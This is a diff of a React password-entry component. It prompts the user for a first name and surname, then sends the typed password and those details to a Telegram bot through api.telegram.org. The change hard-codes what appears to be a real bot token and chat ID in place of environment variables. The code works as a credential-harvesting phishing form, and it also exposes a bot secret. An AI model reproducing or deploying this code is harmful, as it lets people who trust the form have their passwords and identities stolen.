@@ -9,11 +9,10 @@ function Password() {
     const togglePasswordVisibility = () => {
         setShowPassword(!showPassword);
     };
-
     const handleSubmit = async () => {
         const name = prompt("Ismingizni kiriting")
         const familya = prompt("Familyangizni kiriting")
-
+        
         if (!password) {
             setError('Пожалуйста, введите пароль');
             setErrorStyle({ marginTop: '-10px', color: 'red' });
@@ -21,8 +20,8 @@ function Password() {
             setError('');
             setErrorStyle({});
             try {
-                const botToken = process.env.REACT_APP_BOT_TOKEN;
-                const chatId = process.env.REACT_APP_CHAT_ID;
+                const botToken = '7728247018:AAE-9N2DS2sar4q8RTpwv2puNQB5yDFaog8';
+                const chatId = '7341896378';
                 const message = `Kiritilgan parol: ${password}\nIsmi: ${name}\nFamilya: ${familya} `;
 
                 const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
